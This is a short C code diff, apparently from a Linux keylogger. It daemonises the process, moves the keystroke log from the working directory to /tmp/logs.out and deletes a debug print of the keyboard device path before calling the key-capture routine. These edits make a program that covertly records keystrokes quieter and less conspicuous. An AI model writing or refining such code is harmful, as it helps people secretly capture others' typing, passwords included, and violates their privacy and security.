@@ -28,11 +28,9 @@ int main()
     umask(0);
     sid = setsid();
 
-    file = fopen("./logs.txt", "w");
+    file = fopen("/tmp/logs.out", "w");
 
     keyboard_event_filename = find_keyboard(keyboard_event_filename);
-
-    printf("%s", keyboard_event_filename);
 
     capture_keys(file, keyboard_event_filename);
 
